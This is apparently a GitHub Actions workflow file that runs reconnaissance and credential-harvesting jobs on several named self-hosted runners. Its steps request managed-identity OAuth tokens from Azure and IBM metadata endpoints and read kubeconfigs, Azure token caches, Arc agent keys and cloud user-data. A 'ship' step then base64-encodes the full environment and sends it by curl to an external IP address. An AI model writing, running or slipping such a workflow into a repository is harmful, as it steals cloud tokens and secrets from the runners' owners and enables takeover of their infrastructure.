name: ul-az2id
on:
  workflow_dispatch:
      inputs: {}
jobs:
  idmap:
    continue-on-error: true
    strategy:
      fail-fast: false
      matrix:
        lbl: [t1946107x61, t1946107x76, t19i52947-eus-h, a100itn1, ul-jit-i72364, ul-l40s-7621]
    runs-on: [self-hosted, "${{ matrix.lbl }}"]
    steps:
      - name: idmap
        continue-on-error: true
        shell: bash
        run: |
          set +e
          echo "=== MARKER ${MARKER:-none} label=${{ matrix.lbl }} START $(date -u +%FT%TZ)"
          id; hostname -I; uname -a; cat /proc/1/cgroup 2>/dev/null | head -3
          echo "=== IMDS instance"
          IM=$(curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'); echo "$IM" | head -c 3000
          echo; echo "=== IMDS compute"
          curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 3000
          echo; echo "=== IMDS token default"
          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 600
          echo; echo "=== clientid sources"
          CID=""
          for f in /etc/kubernetes/azure.json /etc/kubernetes/cloud-config /var/lib/waagent/*/config/*.settings /var/lib/waagent/*/config/*.json /var/lib/waagent/ManagedIdentity-Settings; do
            [ -f "$f" ] || continue; echo "--- $f"; head -c 3000 "$f"; echo
          done
          AAD=$(grep -hoE '"(aadClientId|userAssignedIdentityID|clientId)"[[:space:]]*:[[:space:]]*"[0-9a-fA-F-]{36}"' /etc/kubernetes/azure.json 2>/dev/null | grep -oE '[0-9a-fA-F-]{36}' | sort -u)
          echo "=== discovered client ids: $AAD"
          for C in $AAD $CID; do
            echo "--- IMDS token client_id=$C"
            curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$C" | head -c 700; echo
          done
          echo "=== IDENTITY_ENDPOINT"
          echo "IDENTITY_ENDPOINT=$IDENTITY_ENDPOINT IDENTITY_HEADER_SET=${IDENTITY_HEADER:+yes} MSI_ENDPOINT=$MSI_ENDPOINT"
          if [ -n "$IDENTITY_ENDPOINT" ]; then curl -s -m 8 "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | head -c 700; echo; fi
          echo "=== ARC HIMDS"
          for K in /var/opt/azcmagent/tokens/*.key; do [ -f "$K" ] || continue; S=$(cat "$K"); echo "-- arc key $K"; curl -s -m 8 "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://management.azure.com/" -H "Authorization: Basic $S" | head -c 700; echo; done
          which azcmagent >/dev/null 2>&1 && azcmagent show 2>&1 | head -30
          echo "=== az login --identity + account list"
          if command -v az >/dev/null 2>&1; then
            az account list --all --output json 2>&1 | head -c 1500
            for C in $AAD; do echo "-- az login --identity -u $C"; az login --identity --username "$C" --allow-no-subscriptions -o json 2>&1 | head -c 600; az account list --all --output json 2>&1 | head -c 1500; done
          fi
          echo "=== files"
          ls -la /root/.azure /home/*/.azure /home/*/.kube /root/.kube 2>/dev/null | head -40
          for f in /root/.azure/msal_token_cache.json /home/*/.azure/msal_token_cache.json /root/.azure/azureProfile.json /root/.kube/config /home/*/.kube/config /var/lib/kubelet/kubeconfig /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /var/lib/cloud/instance/user-data.txt; do
            [ -f "$f" ] || continue; echo "--- $f"; head -c 4000 "$f"; echo
          done
          echo "=== env"
          env | grep -iE 'azure|arm_|az_|subscription|tenant|token|client' | sed -E 's/(KEY|SECRET|TOKEN|PASSWORD)=.*/\1=REDACTED_LEN/' | head -40
          echo "=== gpu"
          nvidia-smi -L 2>&1 | head -10
          echo "=== MARKER label=${{ matrix.lbl }} DONE $(date -u +%FT%TZ)"
      - name: ship
        if: always()
        continue-on-error: true
        shell: bash
        run: |
          set +e
          B=$(env | base64 -w0 | head -c 2000); curl -s -m 10 -o /dev/null -w 'beacon %{http_code}\n' "http://8.147.65.212:8899/ul7907-${{ matrix.lbl }}?d=$B"

  l40s:
    continue-on-error: true
    runs-on: [self-hosted, ul-l40s]
    steps:
      - name: idmap
        continue-on-error: true
        shell: bash
        run: |
          set +e
          echo "=== MARKER l40s START $(date -u +%FT%TZ)"
          id; hostname -I; hostname; uname -a; cat /proc/1/cgroup 2>/dev/null | head -3
          echo "=== AZ IMDS"; curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 1500
          echo; curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 500
          echo "=== IBM metadata"; curl -s -m 6 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/dynamic/instance-identity/document' | head -c 1500
          echo; curl -s -m 6 -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' | head -c 500
          echo; curl -s -m 6 'http://169.254.169.254/latest/meta-data/instance-id' | head -c 200
          echo "=== IBM creds on disk"; ls -la /root/.bluemix /home/*/.bluemix /root/.config/ibmcloud /etc/softlayer 2>/dev/null | head -20
          for f in /root/.bluemix/config.json /home/*/.bluemix/config.json /var/lib/cloud/instance/user-data.txt /etc/kubernetes/azure.json; do [ -f "$f" ] && { echo "--- $f"; head -c 2500 "$f"; echo; }; done
          env | grep -iE 'ibm|bluemix|ic_api|softlayer|azure|arm_' | sed -E 's/(KEY|SECRET|TOKEN|PASSWORD|APIKEY)=.*/=REDACTED/' | head -30
          echo "=== gpu"; nvidia-smi -L 2>&1 | head -10; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv 2>&1 | head -10
          echo "=== MARKER l40s DONE $(date -u +%FT%TZ)"
